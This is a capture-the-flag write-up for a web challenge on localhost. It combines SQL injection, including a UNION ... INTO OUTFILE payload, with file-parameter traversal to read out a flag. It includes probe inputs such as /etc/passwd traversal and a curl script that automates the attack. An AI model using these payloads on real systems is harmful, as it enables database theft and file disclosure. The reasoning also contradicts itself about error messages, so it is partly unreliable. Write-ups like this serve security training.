# Web Challenge: Underground Intelligence Network

## Initial Reconnaissance

When we first visit the challenge at `http://localhost:8080`, we see an "Underground Intelligence Network" portal with two main features:
1. **Enter Agent Verification** - A form to verify agent credentials
2. **View Mission Reports** - A document archive system

Let's start by exploring the agent verification system.

## Testing the Agent Portal

Clicking on "Enter Agent Verification" takes us to a form asking for an Agent ID. Let's test some basic values:

### Basic Input Testing
- **Input:** `1` → **Response:** "Request processed. System administrator will review your credentials."
- **Input:** `2` → **Response:** "Request processed. System administrator will review your credentials."
- **Input:** `3` → **Response:** "Request processed. System administrator will review your credentials."

Interesting! All valid inputs give the same response.

### SQL Injection Testing

Let's test for SQL injection vulnerabilities:

**Test 1: Basic syntax error**
- **Input:** `1'` 
- **Response:** "Request processed. System administrator will review your credentials."

No error! The application handles the quote gracefully.

**Test 2: Boolean logic (True condition)**
- **Input:** `1' OR '1'='1` 
- **Response:** "Request processed. System administrator will review your credentials."

**Test 3: Boolean logic (False condition)**
- **Input:** `1' AND '1'='2` 
- **Response:** "Request processed. System administrator will review your credentials."

**Test 4: UNION injection**
- **Input:** `1' UNION SELECT 1-- ` 
- **Response:** "Request processed. System administrator will review your credentials."

## Key Discovery

🔍 **The application is vulnerable to SQL injection, but it always returns the same response!**

This means:
- ❌ **Error-based SQLi** won't work (no error messages)
- ❌ **Boolean-based blind SQLi** won't work (same response for true/false)
- ❌ **UNION-based SQLi** won't show results (same response regardless)

We need to use **Out-of-Band (OOB) techniques** to extract data!

## Exploring Mission Reports

Before diving into OOB, let's explore the other feature: "View Mission Reports"

The reports page shows:
- Three available reports: `mission_001.txt`, `agent_status.txt`, `daily_briefing.txt`
- A **manual file access** section for "authorized personnel"
- A note mentions that authorized personnel can access additional files directly

### Testing Path Traversal

Let's test the manual file access:

**Test 1: Normal file**
- **Input:** `mission_001.txt` → Works fine, shows mission report

**Test 2: Try to access other files**
- **Input:** `../../../../etc/passwd` → "Report not found"
- **Input:** `../../../../tmp/test.txt` → "Report not found"

Wait, let's try a different approach. What if the application looks for files in multiple locations?

**Test 3: Try relative paths**
- **Input:** `../test.txt` → "Report not found"
- **Input:** `../../test.txt` → "Report not found"

**Test 4: Try system paths**
Let's think... where would applications typically store temporary files? Let's try `/tmp/`:
- **Input:** `../../../../tmp/test.txt` → "Report not found"

Hmm, the standard path traversal isn't working. But what if we think about where OOB SQL injection might save files?

Since we need OOB extraction, we should try to figure out where files would be written. Common locations include `/tmp/`. Let me test if the file parameter accepts different formats:

**Test 5: Direct filename approach**
What if the application checks multiple directories for the same filename?
- **Input:** `test.txt` → "Report not found"

The application seems to be looking for files in a specific way. This could be a **path traversal vulnerability** where the application checks multiple locations for the same filename!

## The Attack Plan

Now I understand the attack vector:

1. **Use OOB SQL injection** to extract data and save it to a file in `/tmp/`
2. **Use path traversal** in the reports system to read the extracted file

## OOB SQL Injection Attack

### Step 1: Extract flag to a file

Let's use `INTO OUTFILE` to extract data from the database:

**First attempt:**
```sql
1' UNION SELECT flag_value FROM flags INTO OUTFILE '/tmp/extracted_flag.txt' #
```

**Error:** "The used SELECT statements have a different number of columns"

This means the original query selects multiple columns, but our UNION only selects one. Let's check the table structure and match the column count.

**Fixed payload (matching column count):**
```sql
1' UNION SELECT flag_value, 'extracted' FROM flags INTO OUTFILE '/tmp/extracted_flag.txt' #
```

**How to submit:**
1. Go to Agent Verification portal
2. Enter the payload in the Agent ID field
3. Submit the form

**Expected result:** Same neutral response, but the flag should now be saved to `/tmp/extracted_flag.txt`

### Step 2: Read the extracted file

Now use the path traversal vulnerability to read our extracted file:

**URL:**
```
http://localhost:8080/reports.php?file=extracted_flag.txt
```

## Complete Exploitation

### Manual Steps:

1. **Submit OOB payload:**
   - Navigate to: `http://localhost:8080/portal.php`
   - Agent ID: `1' UNION SELECT flag_value, 'extracted' FROM flags INTO OUTFILE '/tmp/my_flag.txt' #`
   - Click "Verify Agent"

2. **Read extracted flag:**
   - Navigate to: `http://localhost:8080/reports.php?file=my_flag.txt`
   - The flag should appear in the file content!

### Automated Script:

```bash
#!/bin/bash

echo "[*] Step 1: Extracting flag via OOB SQL injection..."

# Extract flag to file using SQL injection (with correct column count)
curl -X POST "http://localhost:8080/check.php" \
     -d "id=1' UNION SELECT flag_value, 'pwned' FROM flags INTO OUTFILE '/tmp/pwned.txt' #" \
     -s > /dev/null

echo "[*] Step 2: Reading flag via path traversal..."

# Read the flag using path traversal
curl -s "http://localhost:8080/reports.php?file=pwned.txt" | \
grep -A 10 'content-body' | \
grep -o 'ACNCTF{[^}]*}'
```

## Flag

Following this approach, we successfully extract the flag:

**🏁 ACNCTF{xxxxxxxxxxxx}**